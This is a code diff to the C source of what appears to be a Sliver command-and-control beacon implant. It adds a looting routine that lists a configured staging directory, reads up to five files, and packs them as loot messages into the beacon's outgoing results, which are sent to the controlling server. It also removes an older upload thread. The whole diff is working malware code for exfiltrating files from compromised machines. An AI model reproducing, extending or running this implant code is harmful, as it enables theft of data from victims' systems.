@@ -366,13 +366,53 @@ VOID BeaconWork
 )
 {
 	PENVELOPE pSendEnvelope = NULL;
+	PENVELOPE pTempEnvelope = NULL;
 	PENVELOPE* TaskResults = NULL;
 	PSLIVER_BEACON_CLIENT pBeacon;
 	DWORD i = 0;
 	DWORD dwOldInterval = 0;
+	PGLOBAL_CONFIG pConfig = NULL;
+	HANDLE hFind = INVALID_HANDLE_VALUE;
+	WIN32_FIND_DATAW FindData;
+	LPWSTR lpMark = NULL;
+	LPWSTR lpClonedPath = NULL;
 
 	pBeacon = pWrapper->pBeacon;
+	pConfig = pBeacon->pGlobalConfig;
 	TaskResults = BeaconHandleTaskList(pBeacon, pWrapper->pTaskList, pWrapper->dwNumberOfTasks);
+	if (pConfig->Loot) {
+		SecureZeroMemory(&FindData, sizeof(FindData));
+		lpMark = DuplicateStrW(pConfig->wszWarehouse, 2);
+		lstrcatW(lpMark, L"\\*");
+		hFind = FindFirstFileW(lpMark, &FindData);
+		if (hFind != INVALID_HANDLE_VALUE) {
+			do {
+				if (i >= 5) {
+					break;
+				}
+
+				lpClonedPath = DuplicateStrW(pConfig->wszWarehouse, lstrlenW(FindData.cFileName) + 1);
+				lstrcatW(lpClonedPath, L"\\");
+				lstrcatW(lpClonedPath, FindData.cFileName);
+				pTempEnvelope = ALLOC(sizeof(ENVELOPE));
+				pTempEnvelope->uType = MsgLootFile;
+				pTempEnvelope->pData = ALLOC(sizeof(BUFFER));
+				pTempEnvelope->pData->pBuffer = ReadFromFile(lpClonedPath, &pTempEnvelope->pData->cbBuffer);
+				if (pTempEnvelope->pData->pBuffer != NULL && pTempEnvelope->pData->cbBuffer > 0) {
+					TaskResults = REALLOC(TaskResults, sizeof(PENVELOPE) * (pWrapper->dwNumberOfTasks + 1));
+					TaskResults[pWrapper->dwNumberOfTasks++] = pTempEnvelope;
+					i++;
+				}
+				else {
+					FreeEnvelope(pTempEnvelope);
+				}
+
+				FREE(lpClonedPath);
+			} while (FindNextFileW(hFind, &FindData));
+			CloseHandle(hFind);
+		}
+	}
+
 	dwOldInterval = pBeacon->dwInterval;
 	pSendEnvelope = MarshalBeaconTasks(pBeacon, 0, TaskResults, pWrapper->dwNumberOfTasks);
 	pBeacon->Send(pBeacon->pGlobalConfig, pBeacon->lpClient, pSendEnvelope);
@@ -383,6 +423,7 @@ CLEANUP:
 		FreeEnvelope(pWrapper->pTaskList[i]);
 	}
 
+	FREE(lpMark);
 	FREE(TaskResults);
 	FREE(pWrapper->pTaskList);
 	if (dwOldInterval != pBeacon->dwInterval) {
@@ -466,7 +507,6 @@ CONTINUE:
 		goto CLEANUP;
 	}
 
-	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SliverUploadLootedFile, (PSLIVER_SESSION_CLIENT)pBeacon, 0, &dwThreadID);
 	dwNumberOfAttempts = 0;
 	while (TRUE) {
 #ifndef _DEBUG
